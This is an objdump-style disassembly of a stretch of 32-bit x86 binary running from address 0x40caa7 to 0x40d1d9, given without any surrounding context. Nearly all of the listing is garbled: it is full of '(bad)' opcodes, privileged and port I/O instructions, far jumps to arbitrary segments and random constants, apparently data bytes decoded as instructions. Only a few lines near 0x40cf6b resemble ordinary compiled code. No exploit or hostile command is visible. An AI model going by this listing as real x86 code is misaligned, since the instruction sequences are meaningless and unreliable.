  40caa7:	and    BYTE PTR [edi],0x71
  40caaa:	in     eax,0xe8
  40caac:	inc    esi
  40caad:	mov    ds:0x34c2c501,al
  40cab2:	sub    esp,DWORD PTR [esi+0x75044e9d]
  40cab8:	ret    
  40cab9:	sub    al,0x16
  40cabb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cabc:	outs   dx,DWORD PTR ds:[esi]
  40cabd:	adc    edx,DWORD PTR [ecx]
  40cabf:	cld    
  40cac0:	push   ebx
  40cac1:	jmp    0xdde5:0x55290649
  40cac8:	out    dx,eax
  40cac9:	or     eax,DWORD PTR [eax-0x5c]
  40cacc:	push   ebp
  40cacd:	(bad)
  40cad1:	enter  0xfb77,0x22
  40cad5:	sahf   
  40cad6:	stos   DWORD PTR es:[edi],eax
  40cad7:	fprem1 
  40cad9:	sbb    al,0x79
  40cadb:	mov    ebx,0x3347962
  40cae0:	stos   BYTE PTR es:[edi],al
  40cae1:	mov    ds,WORD PTR [ebx]
  40cae3:	ret    0x5162
  40cae6:	repz ss jg 0x40cb63
  40caea:	test   al,0x5e
  40caec:	dec    esi
  40caed:	jmp    0x40cad1
  40caef:	loop   0x40cb66
  40caf1:	ret    0x8fc8
  40caf4:	shr    BYTE PTR ds:0x763afcce,1
  40cafa:	xchg   edi,eax
  40cafb:	fist   WORD PTR [eax]
  40cafd:	outs   dx,DWORD PTR ds:[esi]
  40cafe:	cmp    cl,al
  40cb00:	(bad)  
  40cb01:	push   edi
  40cb02:	int    0x2f
  40cb04:	mov    bl,BYTE PTR [ebx]
  40cb06:	mov    dl,0xc8
  40cb08:	xor    eax,DWORD PTR fs:[esi]
  40cb0b:	or     eax,0xe5c315f0
  40cb10:	mov    dh,0xdc
  40cb12:	pop    eax
  40cb13:	cdq    
  40cb14:	sub    eax,0xb5388d06
  40cb19:	out    0xb5,al
  40cb1b:	push   ss
  40cb1c:	ins    DWORD PTR es:[edi],dx
  40cb1d:	repnz lahf 
  40cb1f:	cmc    
  40cb20:	push   ecx
  40cb21:	lds    ebx,FWORD PTR [edx]
  40cb23:	dec    ebx
  40cb24:	or     bh,ch
  40cb26:	(bad)  
  40cb27:	int3   
  40cb28:	int3   
  40cb29:	dec    eax
  40cb2a:	sahf   
  40cb2b:	or     DWORD PTR [edi+0x34],esp
  40cb2e:	cmp    DWORD PTR [edx+0x63fb25d4],ebx
  40cb34:	gs (bad) 
  40cb37:	push   ss
  40cb38:	and    eax,0xc3002e47
  40cb3d:	and    eax,0xfa9bfe6f
  40cb42:	popa   
  40cb43:	sub    edx,DWORD PTR [edi]
  40cb45:	adc    eax,0x1710748b
  40cb4a:	out    dx,eax
  40cb4b:	cdq    
  40cb4c:	aas    
  40cb4d:	pop    esi
  40cb4e:	pop    esp
  40cb4f:	xor    DWORD PTR [eax],esi
  40cb51:	rep lods eax,DWORD PTR ds:[esi]
  40cb53:	outs   dx,DWORD PTR ds:[esi]
  40cb54:	mov    ebp,0xd49a320
  40cb59:	inc    ebp
  40cb5a:	push   ebp
  40cb5b:	inc    ecx
  40cb5c:	jl     0x40cbb6
  40cb5e:	fcomp  QWORD PTR [ebx]
  40cb60:	cmc    
  40cb61:	xchg   ecx,eax
  40cb62:	(bad)  [edi+0x4b]
  40cb65:	push   di
  40cb67:	and    DWORD PTR [esi],esi
  40cb69:	repnz not ah
  40cb6c:	xchg   esp,eax
  40cb6d:	fcos   
  40cb6f:	pop    eax
  40cb70:	adc    cl,BYTE PTR [eax+0xc440604]
  40cb76:	dec    ebx
  40cb77:	xor    DWORD PTR [eax],edx
  40cb79:	rol    BYTE PTR [eax-0x18],cl
  40cb7c:	and    eax,0x90870a04
  40cb81:	mov    al,0xd7
  40cb83:	adc    al,BYTE PTR [eax]
  40cb85:	iret   
  40cb86:	test   dl,cl
  40cb88:	jnp    0x40cb91
  40cb8a:	ror    dl,cl
  40cb8c:	cwd    
  40cb8e:	xchg   esp,eax
  40cb8f:	mov    DWORD PTR [edx+0x44adf9d5],esp
  40cb95:	clc    
  40cb96:	ss push edx
  40cb98:	and    ebp,DWORD PTR [eax]
  40cb9a:	mov    bh,0x3a
  40cb9d:	lods   eax,DWORD PTR ds:[esi]
  40cb9e:	jle    0x40cb71
  40cba0:	jmp    0xbc00aba3
  40cba5:	cmp    al,0x33
  40cba7:	cdq    
  40cba8:	rcl    BYTE PTR [edx+0x37a1b43d],0x7f
  40cbaf:	adc    bh,bh
  40cbb1:	cmp    edx,DWORD PTR [edi]
  40cbb3:	cmp    DWORD PTR [ebx-0x92d0157],ebp
  40cbb9:	imul   esi,DWORD PTR [eax],0xffffffd0
  40cbbc:	jbe    0x40cbeb
  40cbbe:	rol    BYTE PTR ds:[esp+ebp*8-0x6da56315],cl
  40cbc6:	inc    esp
  40cbc7:	push   0x8e104160
  40cbcc:	sbb    cl,BYTE PTR [bp+si-0x7a4f]
  40cbd1:	sahf   
  40cbd2:	push   ds
  40cbd3:	sahf   
  40cbd4:	pop    eax
  40cbd5:	cwde   
  40cbd6:	call   FWORD PTR [ecx-0x77e973f4]
  40cbdc:	sbb    al,0x9c
  40cbde:	sbb    bl,BYTE PTR [edi+0x6d]
  40cbe1:	std    
  40cbe2:	and    ebx,DWORD PTR [edi+0x48]
  40cbe5:	cmp    esi,eax
  40cbe7:	fs jp  0x40cbcf
  40cbea:	xchg   DWORD PTR [ebx-0xe15aef],ebx
  40cbf0:	adc    BYTE PTR [eax-0x3b],0xfd
  40cbf4:	imul   ebx,DWORD PTR [edx+esi*8-0x60b57a9],0x31
  40cbfc:	ja     0x40cb81
  40cbfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbff:	xchg   ebp,eax
  40cc00:	outs   dx,BYTE PTR ds:[esi]
  40cc01:	mov    ecx,0x2f54c32d
  40cc06:	mov    ebx,0xf64b3865
  40cc0b:	cli    
  40cc0c:	repnz inc ebx
  40cc0e:	push   cs
  40cc0f:	(bad)  
  40cc10:	cs pop ss
  40cc12:	ret    0xb6ea
  40cc15:	shr    DWORD PTR [esp+esi*4-0x8],cl
  40cc19:	add    bh,cl
  40cc1b:	push   ds
  40cc1c:	pop    esp
  40cc1d:	popf   
  40cc1e:	sub    dh,BYTE PTR [edi-0x60]
  40cc21:	test   DWORD PTR [edx],0x793ffbbb
  40cc27:	jne    0x40cc4f
  40cc29:	pop    es
  40cc2a:	inc    DWORD PTR [ebx-0x1acbb786]
  40cc30:	inc    eax
  40cc31:	cli    
  40cc32:	inc    esi
  40cc33:	lods   al,BYTE PTR ds:[esi]
  40cc34:	add    edi,DWORD PTR [edx-0x58b7db4]
  40cc3a:	xor    eax,0xef0f514c
  40cc3f:	adc    ch,BYTE PTR [eax-0x1b8e8dbf]
  40cc45:	cmp    DWORD PTR [edi],0x66da93c5
  40cc4b:	mov    eax,0x3b6e2a8b
  40cc50:	xor    BYTE PTR [edx-0x1f],dh
  40cc53:	in     al,0xf1
  40cc55:	pop    ds
  40cc56:	pop    ebp
  40cc57:	jo     0x40cc2a
  40cc59:	push   eax
  40cc5a:	add    al,0x5f
  40cc5c:	cmp    ebp,DWORD PTR [edx+0x3976142c]
  40cc62:	mov    DWORD PTR [ebx+0x76f5fe52],esp
  40cc68:	jl     0x40ccc3
  40cc6a:	and    BYTE PTR [ebp+0x6d],cl
  40cc6d:	adc    DWORD PTR [edx+0x65f2f9ad],ebx
  40cc73:	outs   dx,BYTE PTR ds:[esi]
  40cc74:	pop    esi
  40cc75:	clc    
  40cc76:	shl    DWORD PTR [ecx+0x1e],0x6c
  40cc7a:	or     DWORD PTR [ebx],esi
  40cc7c:	mov    WORD PTR [ebp-0x5d],?
  40cc7f:	shl    BYTE PTR [edi],0x42
  40cc82:	jl     0x40ccd7
  40cc84:	jge    0x40cc66
  40cc86:	sar    DWORD PTR [esi-0x65a6f519],1
  40cc8c:	ffreep st(4)
  40cc8e:	call   0x341d023d
  40cc93:	loope  0x40ccf0
  40cc95:	pop    ebx
  40cc96:	repnz xchg ebx,eax
  40cc98:	fcom   DWORD PTR [edi]
  40cc9a:	or     al,0xe9
  40cc9c:	mov    al,ds:0x4aed47be
  40cca1:	mov    eax,0xea7b9287
  40cca6:	pop    eax
  40cca7:	jnp    0x40cc6e
  40cca9:	sub    BYTE PTR ds:0xb9fb7b2b,dh
  40ccaf:	std    
  40ccb0:	sbb    DWORD PTR [edx+esi*2],ecx
  40ccb3:	push   ecx
  40ccb4:	inc    ebx
  40ccb5:	stos   DWORD PTR es:[edi],eax
  40ccb6:	push   edx
  40ccb7:	jae    0x40ccd1
  40ccb9:	adc    dl,BYTE PTR [ebx+0x60999b30]
  40ccbf:	adc    ah,BYTE PTR [ebx-0x5d]
  40ccc2:	fidivr WORD PTR [edi+0x230cb9e0]
  40ccc8:	cmp    dl,ah
  40ccca:	das    
  40cccb:	xchg   edx,eax
  40cccc:	inc    eax
  40cccd:	cmc    
  40ccce:	jne    0x40cd49
  40ccd0:	inc    ecx
  40ccd1:	or     al,0xc1
  40ccd3:	xor    BYTE PTR [edx+0x52],cl
  40ccd6:	imul   edi,ebx,0xffffffe6
  40ccd9:	cmc    
  40ccda:	inc    ecx
  40ccdb:	dec    edx
  40ccdc:	adc    BYTE PTR [edi],0xc0
  40ccdf:	pop    esi
  40cce0:	cmp    eax,0xff8f842b
  40cce5:	xchg   ebp,eax
  40cce6:	cmp    dh,BYTE PTR [edi]
  40cce8:	sti    
  40cce9:	stos   DWORD PTR es:[edi],eax
  40ccea:	push   cs
  40cceb:	ror    BYTE PTR [edi-0x55],cl
  40ccee:	pop    ds
  40ccef:	pusha  
  40ccf0:	stos   DWORD PTR es:[edi],eax
  40ccf1:	mov    ebx,0x42e42dad
  40ccf6:	iret   
  40ccf7:	call   0xad8e:0xf9c7955b
  40ccfe:	inc    esi
  40ccff:	jmp    0x6d67:0xa71ea81c
  40cd06:	jne    0x40cc8f
  40cd08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd09:	and    esp,DWORD PTR [esp+ebp*4]
  40cd0c:	sub    eax,0x83c4d8df
  40cd11:	repz rcl DWORD PTR [ebp+0x5],cl
  40cd15:	mov    esi,0x5e95ac50
  40cd1a:	or     BYTE PTR [esi+0x37],cl
  40cd1d:	mov    bh,0x87
  40cd1f:	jmp    0xb624:0x65b84d31
  40cd26:	dec    eax
  40cd27:	in     eax,0xa6
  40cd29:	fst    DWORD PTR [ecx+0x4da94647]
  40cd2f:	pop    edx
  40cd30:	inc    esp
  40cd31:	adc    esp,DWORD PTR [ebp+0x3cecc475]
  40cd37:	xchg   ebx,eax
  40cd38:	pop    ecx
  40cd39:	add    eax,0xd3f104fb
  40cd3e:	(bad)  
  40cd3f:	data16 out 0x1d,al
  40cd42:	lock aaa 
  40cd44:	out    0x62,al
  40cd46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd47:	mov    esp,0xd0fd0833
  40cd4c:	outs   dx,DWORD PTR ds:[esi]
  40cd4d:	add    al,0x46
  40cd4f:	push   esi
  40cd50:	inc    eax
  40cd51:	imul   ebx,DWORD PTR [ebp+ecx*1-0xd1e6956],0xdcab6781
  40cd5c:	hlt    
  40cd5d:	scas   eax,DWORD PTR es:[edi]
  40cd5e:	jne    0x40cd48
  40cd60:	pop    es
  40cd61:	pop    eax
  40cd62:	pusha  
  40cd63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd64:	cmp    DWORD PTR [esi],ebp
  40cd66:	adc    BYTE PTR [eax],ch
  40cd68:	cs pop ecx
  40cd6a:	scas   eax,DWORD PTR es:[edi]
  40cd6b:	dec    ecx
  40cd6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd6d:	fs jne 0x40cdac
  40cd70:	pop    ecx
  40cd71:	jge    0x40cd41
  40cd73:	ret    0xd7a7
  40cd76:	mov    al,0x69
  40cd78:	jbe    0x40cd3e
  40cd7a:	adc    edi,eax
  40cd7c:	or     eax,0x1a002b4c
  40cd81:	call   0x432908df
  40cd86:	popa   
  40cd87:	les    ecx,FWORD PTR [ebx]
  40cd89:	inc    ebp
  40cd8a:	sar    BYTE PTR [esi],1
  40cd8c:	aaa    
  40cd8d:	lahf   
  40cd8e:	outs   dx,BYTE PTR ds:[esi]
  40cd8f:	in     eax,dx
  40cd90:	adc    ch,BYTE PTR [eax]
  40cd92:	mov    ch,0x45
  40cd94:	inc    ebp
  40cd95:	jns    0x40cdde
  40cd97:	jnp    0x40cdef
  40cd99:	sbb    eax,esi
  40cd9b:	xchg   ecx,eax
  40cd9c:	xchg   esi,eax
  40cd9d:	add    BYTE PTR [ebp-0x40],cl
  40cda0:	es pop eax
  40cda2:	pop    ebx
  40cda3:	jg     0x40ce1f
  40cda5:	pusha  
  40cda6:	push   ebx
  40cda7:	fist   WORD PTR [edx-0x5e]
  40cdaa:	lds    edx,FWORD PTR [edx+esi*4+0x50fbe454]
  40cdb1:	nop
  40cdb2:	stc    
  40cdb3:	mov    dh,0x87
  40cdb5:	dec    esp
  40cdb6:	enter  0x69e6,0x8a
  40cdba:	lock push ds
  40cdbc:	push   0x9c6a506e
  40cdc1:	addr16 nop
  40cdc3:	ss add al,0x51
  40cdc6:	(bad)  
  40cdc7:	mov    BYTE PTR [edx],ah
  40cdc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdca:	or     ebp,DWORD PTR [eax+0xf]
  40cdcd:	out    0xab,al
  40cdcf:	ins    DWORD PTR es:[edi],dx
  40cdd0:	lods   al,BYTE PTR ds:[esi]
  40cdd1:	sub    edi,edi
  40cdd3:	loop   0x40ce37
  40cdd5:	shl    BYTE PTR [ecx-0xe41ddb8],0x14
  40cddc:	xor    ebp,DWORD PTR es:[ecx-0x43]
  40cde0:	loop   0x40ce58
  40cde2:	xchg   ebp,eax
  40cde3:	out    0xb1,al
  40cde5:	cmp    esi,esp
  40cde7:	js     0x40cdf9
  40cde9:	dec    edi
  40cdea:	cmp    ebp,0xdc5ef675
  40cdf0:	(bad)  
  40cdf1:	sti    
  40cdf2:	es push eax
  40cdf4:	stc    
  40cdf5:	pop    ecx
  40cdf6:	jmp    0xe205f9f7
  40cdfb:	nop
  40cdfc:	or     bh,BYTE PTR [ebp-0x74]
  40cdff:	(bad)  
  40ce00:	sub    eax,0xa6826f5
  40ce05:	lods   eax,DWORD PTR ds:[esi]
  40ce06:	or     DWORD PTR [esi],ecx
  40ce08:	dec    esp
  40ce09:	fidivr WORD PTR [ebp+eiz*8-0x4b4b81ff]
  40ce10:	stos   BYTE PTR es:[edi],al
  40ce11:	imul   ebx,DWORD PTR [edx-0xa4c184c],0x28dc0ad
  40ce1b:	fsubr  QWORD PTR ds:0xb8c697d
  40ce21:	jp     0x40ce0b
  40ce23:	iret   
  40ce24:	xchg   edi,eax
  40ce25:	data16 addr16 mov bl,0xde
  40ce29:	repz sub dl,al
  40ce2c:	push   esi
  40ce2d:	lds    esp,FWORD PTR [ebp+0x243a8a82]
  40ce33:	xchg   ecx,edx
  40ce35:	fidivr DWORD PTR [esi-0x53]
  40ce38:	scas   al,BYTE PTR es:[edi]
  40ce39:	(bad)  
  40ce3a:	repnz cdq 
  40ce3c:	mov    dh,0x71
  40ce3e:	(bad)  
  40ce40:	inc    edi
  40ce41:	aaa    
  40ce42:	pushf  
  40ce43:	inc    esi
  40ce44:	arpl   WORD PTR [ecx+0x11],bp
  40ce47:	adc    BYTE PTR [ebp-0x586ddff9],dl
  40ce4d:	popa   
  40ce4e:	mov    al,0xdc
  40ce50:	xchg   ebp,ecx
  40ce52:	mov    ds:0x1dd26e5b,al
  40ce57:	in     eax,dx
  40ce58:	pop    esp
  40ce59:	loopne 0x40ce12
  40ce5b:	push   cs
  40ce5c:	jle    0x40ceba
  40ce5e:	(bad)  
  40ce5f:	stc    
  40ce60:	sbb    dl,bl
  40ce62:	or     al,0x88
  40ce64:	js     0x40ce1c
  40ce66:	push   edx
  40ce67:	pushf  
  40ce68:	mov    ebp,ebp
  40ce6a:	inc    esp
  40ce6b:	mov    esp,0x91179936
  40ce70:	add    esp,DWORD PTR [edx]
  40ce72:	clc    
  40ce73:	pop    ebp
  40ce74:	mov    ds:0x32291004,eax
  40ce79:	int3   
  40ce7a:	and    bh,bh
  40ce7c:	xlat   BYTE PTR ds:[ebx]
  40ce7d:	cmp    DWORD PTR [esi-0x4ec70edc],esp
  40ce83:	jmp    0xbe0053f5
  40ce88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce89:	jge    0x40ced4
  40ce8b:	and    DWORD PTR [esi-0xed95656],ebp
  40ce91:	mov    ecx,ebx
  40ce93:	push   ds
  40ce94:	js     0x40cede
  40ce96:	sub    cl,BYTE PTR [ebp+ebp*4-0x3fcc9839]
  40ce9d:	xor    ah,dh
  40ce9f:	fmul   QWORD PTR [ebp-0x2ee981e6]
  40cea5:	repz push esp
  40cea7:	imul   eax,DWORD PTR [eax-0x4590394f],0x5b1f16f7
  40ceb1:	dec    BYTE PTR [ecx+0x6257e522]
  40ceb7:	and    edx,DWORD PTR [ecx]
  40ceb9:	or     dl,BYTE PTR [ebp+0x44]
  40cebc:	dec    ebx
  40cebd:	sahf   
  40cebe:	mov    ebp,0xe078c0e9
  40cec3:	cmp    al,0xc2
  40cec5:	add    esp,ecx
  40cec7:	mov    eax,0xe6ab8ddf
  40cecc:	fsubr  DWORD PTR [ebx+0x72699b88]
  40ced2:	mov    BYTE PTR [ebp+0x1e],dl
  40ced5:	pusha  
  40ced6:	pop    ebx
  40ced7:	xchg   edi,eax
  40ced8:	call   FWORD PTR [edx-0x5662d27e]
  40cede:	cmp    esp,edi
  40cee0:	bound  edx,QWORD PTR [edx-0x18]
  40cee3:	sbb    eax,0xfa3be9b8
  40cee8:	jae    0x40cf19
  40ceea:	xchg   edx,eax
  40ceeb:	mov    cl,0x84
  40ceed:	mov    es,WORD PTR [edi-0x5d]
  40cef0:	push   ecx
  40cef1:	add    eax,0x6a803e93
  40cef6:	cmp    DWORD PTR [ebp+0x25bfb663],0x45
  40cefd:	push   edx
  40cefe:	push   eax
  40ceff:	syscall 
  40cf01:	sub    ch,ch
  40cf03:	xlat   BYTE PTR ds:[ebx]
  40cf04:	xchg   ecx,eax
  40cf05:	xlat   BYTE PTR ds:[ebx]
  40cf06:	loope  0x40cf0f
  40cf08:	pusha  
  40cf09:	jb     0x40cecb
  40cf0b:	mov    ds:0x26da1389,al
  40cf10:	push   ebx
  40cf11:	add    BYTE PTR [edi+0x2c0d69fd],bh
  40cf17:	push   0x1b
  40cf19:	icebp  
  40cf1a:	cmp    DWORD PTR [ecx+0x4d492c1c],esi
  40cf20:	fisttp WORD PTR [esi]
  40cf22:	mov    ecx,0xffd64173
  40cf27:	imul   eax,edx,0xffffff84
  40cf2a:	fs in  eax,dx
  40cf2c:	loope  0x40cf49
  40cf2e:	dec    esi
  40cf2f:	add    DWORD PTR [ebx+0x6c],ebp
  40cf32:	and    al,0x23
  40cf34:	adc    esp,edi
  40cf36:	mov    edx,0x4cbf251e
  40cf3b:	mov    esi,0x74ec882a
  40cf40:	cmp    edx,DWORD PTR [edi+0x28]
  40cf43:	hlt    
  40cf44:	mov    esi,0x3e579edc
  40cf49:	sbb    DWORD PTR [ecx-0x52],ecx
  40cf4c:	jmp    0x40cfbe
  40cf4e:	push   es
  40cf4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf50:	mov    esp,0x510ea624
  40cf55:	xchg   edx,eax
  40cf56:	in     eax,dx
  40cf57:	add    DWORD PTR [ebp-0x42ef60ce],esp
  40cf5d:	add    ecx,DWORD PTR [edi+eiz*8]
  40cf60:	or     BYTE PTR [ebx],ch
  40cf62:	cmp    BYTE PTR ds:0x614c961f,ch
  40cf68:	stc    
  40cf69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf6a:	in     eax,dx
  40cf6b:	mov    eax,DWORD PTR [ebp-0x34]
  40cf6e:	mov    ecx,DWORD PTR [ebp-0x8]
  40cf71:	mov    DWORD PTR [ecx+0xc],eax
  40cf74:	mov    eax,DWORD PTR [ebp-0x30]
  40cf77:	jmp    0x40d482
  40cf7c:	iret   
  40cf7d:	(bad)  
  40cf7e:	enter  0xd5cb,0xc9
  40cf82:	fcmovnu st,st(2)
  40cf84:	rol    DWORD PTR [edx],1
  40cf86:	ficom  WORD PTR [ebx]
  40cf88:	outs   dx,BYTE PTR ds:[esi]
  40cf89:	inc    ebp
  40cf8a:	nop
  40cf8b:	out    dx,eax
  40cf8c:	loop   0x40cf40
  40cf8e:	js     0x40d008
  40cf90:	push   0x7c
  40cf92:	js     0x40d00c
  40cf94:	xor    DWORD PTR [ebx],ebp
  40cf96:	adc    cl,al
  40cf98:	or     DWORD PTR [ebx*8+0x1cbaff5],esi
  40cf9f:	add    DWORD PTR [bp+si],ebp
  40cfa2:	adc    bl,ch
  40cfa4:	pop    esi
  40cfa5:	and    edx,esi
  40cfa7:	outs   dx,BYTE PTR ds:[esi]
  40cfa8:	scas   eax,DWORD PTR es:[edi]
  40cfa9:	jle    0x40cfb1
  40cfab:	xchg   ebp,eax
  40cfac:	pop    ecx
  40cfad:	push   cs
  40cfae:	pop    eax
  40cfaf:	push   es
  40cfb0:	and    bh,cl
  40cfb2:	adc    dh,BYTE PTR [ecx]
  40cfb4:	add    BYTE PTR [edx],ah
  40cfb6:	jo     0x40cff1
  40cfb8:	mov    esi,eax
  40cfba:	jo     0x40d012
  40cfbc:	ins    BYTE PTR es:[edi],dx
  40cfbd:	xchg   esp,eax
  40cfbe:	mov    bh,0x90
  40cfc0:	test   BYTE PTR [ebx+0x45],bl
  40cfc3:	inc    edx
  40cfc4:	adc    ecx,ebx
  40cfc6:	push   cs
  40cfc7:	dec    esi
  40cfc8:	lods   al,BYTE PTR ds:[esi]
  40cfc9:	xchg   ecx,eax
  40cfca:	and    eax,0x435fd8af
  40cfcf:	sbb    BYTE PTR [esi-0x2],dh
  40cfd2:	xchg   bh,cl
  40cfd4:	shr    ecx,1
  40cfd6:	jl     0x40cfc0
  40cfd8:	sar    DWORD PTR [edx+0x47],0x61
  40cfdc:	sub    BYTE PTR [edx-0x67],dl
  40cfdf:	inc    edi
  40cfe0:	sbb    al,BYTE PTR [ebx]
  40cfe2:	sysret 
  40cfe4:	push   0x59
  40cfe6:	lods   eax,DWORD PTR ds:[esi]
  40cfe7:	and    BYTE PTR [edi],dl
  40cfe9:	stos   BYTE PTR es:[edi],al
  40cfea:	fdiv   QWORD PTR [ebx-0x3e3db64c]
  40cff0:	div    esp
  40cff2:	sbb    bl,BYTE PTR [esi+esi*1+0x4d61b1fa]
  40cff9:	push   es
  40cffa:	inc    edi
  40cffb:	popa   
  40cffc:	out    0xba,eax
  40cffe:	and    esi,DWORD PTR ds:0xe621a079
  40d004:	sar    DWORD PTR [edi],1
  40d006:	scas   al,BYTE PTR es:[edi]
  40d007:	jnp    0x40d002
  40d009:	inc    eax
  40d00a:	mov    ch,0xec
  40d00c:	aam    0x53
  40d00e:	ins    DWORD PTR es:[edi],dx
  40d00f:	stc    
  40d010:	int3   
  40d011:	push   esp
  40d012:	mov    al,ds:0x85e7ac73
  40d017:	pop    esi
  40d018:	cmp    ebx,esp
  40d01a:	in     eax,dx
  40d01b:	pop    ss
  40d01c:	mov    al,ds:0x24c547ae
  40d021:	pop    esi
  40d022:	push   0xdd8e3474
  40d027:	cmc    
  40d028:	sar    BYTE PTR [edx+0x16],0x92
  40d02c:	mov    edx,0x9e801365
  40d031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d032:	mov    cl,0xd5
  40d034:	shl    DWORD PTR ds:0xc31d90f2,0x72
  40d03b:	sub    BYTE PTR [ebx-0x35],bl
  40d03e:	repnz push ecx
  40d040:	inc    eax
  40d041:	and    cl,0x5
  40d044:	mov    esp,0xdf859063
  40d049:	fstp   TBYTE PTR ds:0xba49ff6a
  40d04f:	xor    ebp,eax
  40d051:	mov    BYTE PTR [ebp+0x330db735],dh
  40d057:	sahf   
  40d058:	(bad)  
  40d059:	fldcw  WORD PTR [ebx+0x700575d7]
  40d05f:	fcomp  DWORD PTR [esi+0x7c]
  40d062:	push   edi
  40d063:	in     eax,0xf2
  40d065:	add    ebx,ecx
  40d067:	push   esp
  40d068:	inc    ebx
  40d069:	mov    ebp,0xac42fcd5
  40d06e:	and    DWORD PTR [ebx+ebp*2-0x3bd91565],0x4d
  40d076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d077:	jns    0x40d08c
  40d079:	mov    edx,0x828ef16f
  40d07e:	mov    bl,0xa2
  40d080:	mov    esp,0xdf36180d
  40d085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d086:	mov    ecx,0x20c0ea9a
  40d08b:	push   0x4cfc04e3
  40d090:	xchg   edi,eax
  40d091:	and    dl,BYTE PTR fs:[edx-0x56]
  40d095:	adc    dh,BYTE PTR [eax-0x30091083]
  40d09b:	enter  0xeda7,0x98
  40d09f:	daa    
  40d0a0:	icebp  
  40d0a1:	sbb    BYTE PTR [edx+0x6d5218a0],ah
  40d0a7:	sbb    esp,DWORD PTR ds:0x2c4acb
  40d0ad:	fiadd  DWORD PTR [ebx]
  40d0af:	imul   ecx,DWORD PTR [ebp+0x72],0x103ec4dd
  40d0b6:	ror    DWORD PTR [edi-0x5c3cb92c],1
  40d0bc:	jp     0x40d0fd
  40d0be:	bound  esi,QWORD PTR ss:[ebx+0x5d]
  40d0c2:	jle    0x40d072
  40d0c4:	scas   eax,DWORD PTR es:[edi]
  40d0c5:	jl     0x40d114
  40d0c7:	and    eax,0x34f5ec41
  40d0cc:	inc    esi
  40d0ce:	lods   eax,DWORD PTR ds:[esi]
  40d0cf:	rcr    BYTE PTR [ebx-0x1211b36c],0x13
  40d0d6:	enter  0x76a4,0x64
  40d0da:	inc    BYTE PTR [ebx]
  40d0dc:	stos   DWORD PTR es:[edi],eax
  40d0dd:	rol    DWORD PTR [ebp-0x76c30bf2],0x77
  40d0e4:	test   al,0xda
  40d0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0e7:	and    al,0x8e
  40d0e9:	fcomp  DWORD PTR [ebx]
  40d0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ec:	ror    dh,0xb8
  40d0ef:	(bad)  
  40d0f0:	aad    0xad
  40d0f2:	cmp    eax,0x529335ce
  40d0f7:	lea    ebx,[ecx]
  40d0f9:	add    DWORD PTR [esi],eax
  40d0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0fc:	aam    0xff
  40d0fe:	xor    al,0x44
  40d100:	mov    eax,0xf9f9aa01
  40d105:	sub    dh,cl
  40d107:	mov    es,WORD PTR [ecx-0x31]
  40d10a:	sbb    ah,BYTE PTR [ecx]
  40d10c:	pusha  
  40d10d:	push   ecx
  40d10e:	sbb    edx,ebx
  40d110:	adc    eax,0x2e347c13
  40d115:	adc    BYTE PTR [edx-0x7f],0x9d
  40d119:	sbb    DWORD PTR [esi+0x7672944b],esp
  40d11f:	sbb    esp,DWORD PTR [ecx+ebx*1]
  40d122:	jo     0x40d0f6
  40d124:	mov    dh,0x7c
  40d126:	psubsw mm2,mm5
  40d129:	add    BYTE PTR [eax-0x3cd3b5ac],0xdd
  40d130:	js     0x40d111
  40d132:	mov    ds:0xeb62bea7,eax
  40d137:	enter  0x25ca,0x6
  40d13b:	pop    eax
  40d13c:	ror    BYTE PTR [ecx],0x2e
  40d13f:	aad    0x15
  40d141:	push   esi
  40d142:	pop    ss
  40d143:	xor    ch,bl
  40d145:	add    dh,BYTE PTR [esi+0x13]
  40d148:	push   bp
  40d14a:	push   edx
  40d14b:	sbb    al,0x8f
  40d14d:	jne    0x40d0ff
  40d14f:	shr    DWORD PTR [edi-0x72fb11a4],1
  40d155:	jns    0x40d113
  40d157:	pop    edi
  40d158:	int3   
  40d159:	sbb    esi,ecx
  40d15b:	or     BYTE PTR [ecx+0xd12e800],0x8c
  40d162:	sar    BYTE PTR [esi],cl
  40d164:	add    bl,dh
  40d166:	mov    ecx,0x12f619d1
  40d16b:	push   cs
  40d16c:	ror    DWORD PTR [esi+eax*8-0x794dd087],1
  40d173:	js     0x40d183
  40d175:	mov    ds:0xb6fa92a4,al
  40d17a:	aas    
  40d17b:	call   0x10d98bb0
  40d180:	js     0x40d16b
  40d182:	ror    DWORD PTR ds:0x10b39f53,0x15
  40d18a:	sbb    BYTE PTR fs:[ecx],bh
  40d18d:	sub    eax,0x712fb0d6
  40d192:	retf   0x8fc6
  40d195:	daa    
  40d196:	je     0x40d1c3
  40d198:	mov    esi,DWORD PTR [edi-0x1a]
  40d19b:	leave  
  40d19c:	add    BYTE PTR ds:0x7a5759e8,cl
  40d1a2:	daa    
  40d1a3:	jns    0x40d1e0
  40d1a5:	mov    edx,0xcf2ea014
  40d1aa:	cdq    
  40d1ab:	sub    DWORD PTR [edx-0x3417f20],ebp
  40d1b1:	retf   0x5e6a
  40d1b4:	xchg   esp,eax
  40d1b5:	dec    ebx
  40d1b6:	add    BYTE PTR [esi+0x4e],bh
  40d1b9:	outs   dx,DWORD PTR ds:[esi]
  40d1ba:	mov    ecx,0x1130944e
  40d1bf:	or     BYTE PTR [edi+0x7336ce36],cl
  40d1c5:	out    dx,al
  40d1c6:	and    edi,0xf7bdd50c
  40d1cc:	imul   ebp,DWORD PTR [ebx+0x55],0x70
  40d1d0:	clc    
  40d1d1:	sbb    DWORD PTR [ebp-0x4],esp
  40d1d4:	xchg   esi,eax
  40d1d5:	aaa    
  40d1d6:	xlat   BYTE PTR ds:[ebx]
  40d1d7:	(bad)  
  40d1d9:	call   0xb68b:0x59b30648
